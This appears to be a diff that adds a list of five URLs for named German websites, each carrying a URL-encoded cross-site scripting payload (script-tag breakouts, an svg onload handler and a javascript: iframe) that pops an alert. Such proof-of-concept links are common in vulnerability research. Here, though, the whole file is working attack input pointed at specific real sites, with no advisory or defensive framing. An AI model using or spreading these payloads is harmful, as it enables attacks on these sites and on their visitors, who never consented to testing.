@@ -1,0 +1,5 @@
+http://bns-systems.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://boarisch-gredt-gsunga-gspuit.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+http://bobbooks.de/pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%281337%29%22%3E.vm
+http://bochum-einkaufen.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://bobenheimroxheim-anzeiger.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
